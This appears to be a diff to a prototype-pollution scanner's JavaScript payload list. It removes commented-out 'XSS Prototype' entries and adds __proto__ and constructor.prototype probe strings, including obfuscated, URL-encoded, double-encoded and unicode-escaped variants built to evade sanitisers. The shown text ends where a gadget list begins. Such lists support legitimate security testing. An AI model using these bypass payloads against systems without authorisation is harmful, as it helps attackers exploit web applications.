@@ -1,10 +1,20 @@
 var PAYLOADS = [
-    // ['XSS Prototype #1',  'x[__proto__][e32a5ec9c99]', 'ddcb362f1d60', ],
-    // ['XSS Prototype #2',  'x.__proto__.e32a5ec9c99','ddcb362f1d60', ],
-    ['XSS Prototype #3', '__proto__[e32a5ec9c99]', 'ddcb362f1d60', ],
-    ['XSS Prototype #4', '__proto__.e32a5ec9c99', 'ddcb362f1d60', ],
-    // ['XSS Prototype #5',   '__proto__','{\"e32a5ec9c99\":\"e32a5ec9c99\"}'],
-    // ['XSS Prototype #6',   '__proto__','{\"__proto__\":{\"e32a5ec9c99\":\"e32a5ec9c99\"}}']
+    ['XSS Prototype #3', '__proto__[e32a5ec9c99]', 'ddcb362f1d60'],
+    ['XSS Prototype #4', '__proto__.e32a5ec9c99', 'ddcb362f1d60'],
+    ['Constructor Proto #1', 'constructor[prototype][test]', 'bypass123'],
+    ['Constructor Proto #2', 'constructor.prototype.test', 'bypass123'],
+    ['Proto Dot', '__proto__.test', 'bypass123'],
+    ['Proto Array', '__proto__[test]', 'bypass123'],
+    ['Obfuscated Constructor #1', 'constrconstructoructor[prototype][test]', 'bypass123'],
+    ['Obfuscated Constructor #2', 'constrconstructoructor.prototype.test', 'bypass123'],
+    ['Obfuscated Proto Dot', '__pro__proto__to__.test', 'bypass123'],
+    ['Obfuscated Proto Array', '__pro__proto__to__[test]', 'bypass123'],
+    ['URL Encoded Proto #1', '%5F%5Fproto%5F%5F[polluted]', 'yes'],
+    ['URL Encoded Proto #2', '%5F%5Fproto%5F%5F.polluted', 'yes'],
+    ['Double URL Encoded Proto #1', '%255F%255Fproto%255F%255F[polluted]', 'yes'],
+    ['Double URL Encoded Proto #2', '%255F%255Fproto%255F%255F.polluted', 'yes'],
+    ['Unicode Proto #1', '%5Cu005f%5Cu005fproto%5Cu005f%5Cu005f[polluted]', 'yes'],
+    ['Unicode Proto #2', '%5Cu005f%5Cu005fproto%5Cu005f%5Cu005f.polluted', 'yes']
 ];
 
 var GADGETS = [
